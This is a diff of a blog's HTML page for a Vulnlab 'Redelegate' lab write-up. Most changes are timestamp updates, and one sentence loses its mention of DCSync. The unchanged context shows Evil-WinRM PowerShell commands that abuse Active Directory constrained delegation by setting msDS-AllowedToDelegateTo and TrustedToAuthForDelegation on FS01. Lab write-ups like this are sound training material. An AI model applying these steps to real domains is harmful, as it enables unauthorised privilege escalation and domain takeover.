@@ -7,7 +7,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://assets.vulnlab.com/redelegate_slide.png">
 <meta property="article:published_time" content="2024-11-24T16:47:11.000Z">
-<meta property="article:modified_time" content="2024-11-24T22:47:55.916Z">
+<meta property="article:modified_time" content="2024-11-24T22:48:37.406Z">
 <meta property="article:author" content="serioton">
 <meta property="article:tag" content="vulnlab">
 <meta name="twitter:card" content="summary">
@@ -57,7 +57,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2024-11-24 22:47:55'
+  postUpdate: '2024-11-24 22:48:37'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -226,7 +226,7 @@
 <li>The <code>userAccountControl</code> attribute for the object must be updated with the <code>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code> flag.</li>
 <li>The <code>msDS-AllowedToDelegateTo</code> attribute must be populated with the SPN configured on the delegation tab</li>
 </ul>
-<p>To proceed, let’s first set <code>msDS-AllowedToDelegateTo</code> to <code>cifs</code> (or <code>ldap</code> if you want to perform a DCSync afterwards)</p>
+<p>To proceed, let’s first set <code>msDS-AllowedToDelegateTo</code> to <code>cifs</code> (or <code>ldap</code>)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Helen.Frost\desktop&gt; Set-ADComputer -Identity FS01 -Add @&#123;&#x27;msDS-AllowedToDelegateTo&#x27;=@(&#x27;cifs/dc.redelegate.vl&#x27;)&#125;</span><br></pre></td></tr></table></figure>
 <p>Next, let’s set the <code>TrustedToAuthForDelegation</code> flag</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Helen.Frost\desktop&gt; Set-ADAccountControl -Identity &quot;FS01$&quot; -TrustedToAuthForDelegation $True</span><br></pre></td></tr></table></figure>
